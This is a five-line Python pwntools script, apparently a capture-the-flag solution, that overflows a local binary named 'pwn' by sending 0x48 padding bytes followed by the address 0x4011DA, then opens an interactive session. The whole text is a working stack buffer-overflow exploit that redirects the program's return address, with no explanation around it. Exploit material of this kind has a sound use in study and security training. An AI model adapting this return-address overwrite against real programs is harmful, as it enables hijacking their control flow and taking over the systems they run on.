from pwn import *
r=process('./pwn')
payload=b'a'*0x48+p64(0x4011DA)
r.sendline(payload)
r.interactive()